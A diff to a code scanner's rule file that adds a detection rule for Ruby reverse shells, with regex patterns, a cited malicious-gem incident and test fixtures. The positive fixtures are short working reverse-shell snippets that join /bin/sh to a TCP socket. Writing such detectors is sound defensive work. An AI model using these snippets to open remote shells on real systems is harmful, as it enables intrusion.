@@ -575,6 +575,42 @@ rules:
       negative:
         - "# HTTP calls go through the client module"
 
+  - id: CAP.RB.SHELL_STDIO_JOINED.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: egress
+    title: Joins a shell's input and output to a socket (Ruby)
+    message: >
+      This file opens a socket and then gives a command shell that socket as its standard input
+      and output -- by reopening STDIN and STDOUT onto it before an exec, or by spawning the shell
+      with its streams redirected to it. A shell whose input and output are a socket is a remote
+      prompt, whether the address is a literal, a variable or a setting.
+    remediation: >
+      No action for this signal alone. It is how a reverse shell is written in Ruby.
+    provenance:
+      kind: incident
+      reference: >
+        RubyGems zzhelloworld_socktest (OSV MAL-2026-18126): TCPSocket.new, STDIN/STDOUT/STDERR
+        reopened onto it, exec("/bin/sh", "-i"); the scanner reported nothing (CDI, 2026-10-23).
+    languages: [ruby]
+    baseline_hits: 0
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:TCPSocket|SSLSocket|Socket)\s{0,4}(?:\.\s{0,4}(?:new|open|tcp)|::new)\b[\s\S]{0,1500}?(?:\$std(?:in|out|err)|\bSTD(?:IN|OUT|ERR))\s{0,4}\.\s{0,4}reopen\s{0,4}\([\s\S]{0,800}?\b(?:exec|spawn|system)\s{0,4}[( ]\s{0,4}["''](?:/usr)?(?:/bin/)?(?:ba|z|da|k)?sh\b'
+        - '\b(?:TCPSocket|SSLSocket|Socket)\s{0,4}(?:\.\s{0,4}(?:new|open|tcp)|::new)\b[\s\S]{0,1500}?\b(?:exec|spawn|Process\s{0,4}\.\s{0,4}spawn)\s{0,4}[( ]\s{0,4}["''](?:/usr)?(?:/bin/)?(?:ba|z|da|k)?sh["''][^\n]{0,200}?(?:\[\s{0,4}:in\b|\b(?:in|out|err):\s{0,4}[A-Za-z_@$]|:(?:in|out|err)\s{0,4}=>)'
+    tests:
+      positive:
+        - "s = TCPSocket.new(host, port)\nSTDIN.reopen(s)\nSTDOUT.reopen(s)\nexec(\"/bin/sh\", \"-i\")"
+        - "c = TCPSocket.open(h, p)\nspawn(\"/bin/bash\", \"-i\", [:in, :out, :err] => c)"
+        - "sock = Socket.tcp(addr, 4444)\nProcess.spawn(\"/bin/sh\", in: sock, out: sock, err: sock)"
+      negative:
+        - "s = TCPSocket.new(host, port)\ns.write(payload)\nsystem(\"ls\")"
+        - "STDOUT.reopen(File.open(log, \"a\"))\nexec(\"/bin/sh\", \"-c\", cmd)"
+        - "spawn(\"/bin/sh\", \"-c\", cmd, out: log)"
+
   - id: CAP.RB.PERSIST.001
     version: 1.0.0
     category: policy
